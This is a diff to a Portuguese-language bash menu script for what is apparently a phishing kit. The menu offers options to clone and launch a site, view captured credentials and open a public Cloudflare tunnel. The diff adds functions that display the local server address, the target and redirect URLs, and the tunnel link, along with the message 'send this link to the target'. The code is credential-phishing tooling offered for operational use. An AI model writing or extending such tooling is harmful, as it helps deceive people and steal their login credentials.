@@ -355,8 +355,93 @@ show_history() {
 }
 
 # =============================================
-# PARAR TUDO
+# LOCALHOST - Mostrar IP e porta
 # =============================================
+show_localhost() {
+    clear
+    echo -e "${PURPLE}╔═══════════════════════════════════════════╗${NC}"
+    echo -e "${PURPLE}║         📍 LOCALHOST ATIVO               ║${NC}"
+    echo -e "${PURPLE}╚═══════════════════════════════════════════╝${NC}"
+    echo ""
+
+    if [ ! -f "$SCRIPT_DIR/.server.pid" ]; then
+        echo -e "${RED}  Servidor não está rodando.${NC}"
+        echo ""
+        echo -e "${YELLOW}Enter...${NC}"
+        read
+        return
+    fi
+
+    local pid=$(cat "$SCRIPT_DIR/.server.pid" 2>/dev/null)
+    if ! kill -0 "$pid" 2>/dev/null; then
+        echo -e "${RED}  Servidor parou (PID $pid não existe).${NC}"
+        rm -f "$SCRIPT_DIR/.server.pid"
+        echo ""
+        echo -e "${YELLOW}Enter...${NC}"
+        read
+        return
+    fi
+
+    local port=$(grep 'PORT=' "$SITE_DIR/.config" 2>/dev/null | cut -d= -f2)
+    local my_ip=$(get_my_ip)
+    local target=$(grep 'TARGET_URL=' "$SITE_DIR/.config" 2>/dev/null | cut -d= -f2)
+    local redirect=$(grep 'REDIRECT_URL=' "$SITE_DIR/.config" 2>/dev/null | cut -d= -f2)
+
+    echo -e "  ${GREEN}Servidor:${NC} ${WHITE}Rodando (PID: $pid)${NC}"
+    echo -e "  ${GREEN}IP Local:${NC} ${WHITE}$my_ip${NC}"
+    echo -e "  ${GREEN}Porta:${NC}     ${WHITE}$port${NC}"
+    echo -e "  ${GREEN}Local:${NC}     ${WHITE}http://${my_ip}:${port}${NC}"
+    echo -e "  ${GREEN}Alvo:${NC}      ${WHITE}$target${NC}"
+    echo -e "  ${GREEN}Redirect:${NC}  ${WHITE}$redirect${NC}"
+    echo ""
+    echo -e "${YELLOW}Enter...${NC}"
+    read
+}
+
+# =============================================
+# LINK DO TÚNEL
+# =============================================
+show_tunnel_link() {
+    clear
+    echo -e "${PURPLE}╔═══════════════════════════════════════════╗${NC}"
+    echo -e "${PURPLE}║         🔗 LINK DO TÚNEL                 ║${NC}"
+    echo -e "${PURPLE}╚═══════════════════════════════════════════╝${NC}"
+    echo ""
+
+    if [ ! -f "$SCRIPT_DIR/.tunnel.log" ] || [ ! -s "$SCRIPT_DIR/.tunnel.log" ]; then
+        echo -e "${RED}  Túnel não está rodando.${NC}"
+        echo -e "${YELLOW}  Crie o túnel primeiro (opção 3).${NC}"
+        echo ""
+        echo -e "${YELLOW}Enter...${NC}"
+        read
+        return
+    fi
+
+    local tunnel_url=$(grep -oP 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' "$SCRIPT_DIR/.tunnel.log" 2>/dev/null | head -1)
+
+    if [ -n "$tunnel_url" ] && [ "$tunnel_url" != "" ]; then
+        echo -e "${GREEN}╔═══════════════════════════════════════════╗${NC}"
+        echo -e "${GREEN}║  🌐 LINK PÚBLICO:                        ║${NC}"
+        echo -e "${GREEN}╠═══════════════════════════════════════════╣${NC}"
+        echo -e "${GREEN}║  ${WHITE}$tunnel_url${NC}"
+        echo -e "${GREEN}╚═══════════════════════════════════════════╝${NC}"
+        echo ""
+        echo -e "${YELLOW}  Manda esse link pro alvo!${NC}"
+    else
+        echo -e "${YELLOW}  Túnel rodando mas link não capturado ainda.${NC}"
+        echo -e "${YELLOW}  Verifique: cat $SCRIPT_DIR/.tunnel.log${NC}"
+    fi
+
+    echo ""
+    echo -e "${YELLOW}1) Recriar túnel${NC}"
+    echo -e "${YELLOW}Enter) Voltar${NC}"
+    echo -n "> "
+    read CHOICE
+
+    if [ "$CHOICE" = "1" ]; then
+        start_tunnel
+    fi
+}
 stop_all() {
     if [ -f "$SCRIPT_DIR/.server.pid" ]; then
         local pid=$(cat "$SCRIPT_DIR/.server.pid")
@@ -386,9 +471,11 @@ while true; do
     echo ""
     echo -e "  ${GREEN}1)${NC} 🎣 PHISH     - Clonar e iniciar"
     echo -e "  ${GREEN}2)${NC} 📋 CAPTURAS  - Ver credenciais"
-    echo -e "  ${GREEN}3)${NC} 🌐 TÚNEL     - URL pública"
+    echo -e "  ${GREEN}3)${NC} 🌐 TÚNEL     - Criar URL pública"
     echo -e "  ${GREEN}4)${NC} 📜 HISTÓRICO - Reusar clones"
-    echo -e "  ${GREEN}5)${NC} 🛑 PARAR     - Desligar tudo"
+    echo -e "  ${GREEN}5)${NC} 📍 LOCALHOST - Ver IP e porta"
+    echo -e "  ${GREEN}6)${NC} 🔗 LINK      - Ver link do túnel"
+    echo -e "  ${GREEN}7)${NC} 🛑 PARAR     - Desligar tudo"
     echo ""
     echo -e "  ${RED}0)${NC} ❌ SAIR"
     echo ""
@@ -426,6 +513,12 @@ while true; do
             show_history
             ;;
         5)
+            show_localhost
+            ;;
+        6)
+            show_tunnel_link
+            ;;
+        7)
             stop_all
             echo ""
             echo -e "${YELLOW}Enter...${NC}"
